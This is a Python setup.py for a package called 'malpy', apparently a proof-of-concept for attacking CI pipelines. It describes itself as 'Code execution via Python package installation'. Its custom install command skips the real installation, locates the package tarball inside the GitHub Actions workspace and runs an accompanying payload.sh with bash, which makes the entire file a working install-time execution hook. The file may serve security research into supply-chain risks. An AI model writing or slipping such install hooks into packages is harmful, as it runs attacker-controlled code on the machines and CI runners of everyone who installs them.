import os
import subprocess

from setuptools import setup
from setuptools.command.install import install


def pwd(workspace):
    for root, dirs, files in os.walk(workspace):
        for file in files:
            if file == "malpy-0.1.0.tar.gz":
                return root
    


class PostInstallCommand(install):
    def run(self):
        workspace = os.getenv("GITHUB_WORKSPACE")
        cwd = pwd(workspace)
        payload_sh = os.path.join(cwd, "payload.sh")
        subprocess.run(["bash", payload_sh])
        # install.run(self)


setup(
    name="malpy",
    version="0.1.0",
    description="Code execution via Python package installation (credits: https://github.com/mschwager/0wned).",
    url="https://github.com/nikitastupin/pwnhub",
    cmdclass={
        "install": PostInstallCommand,
    },
)
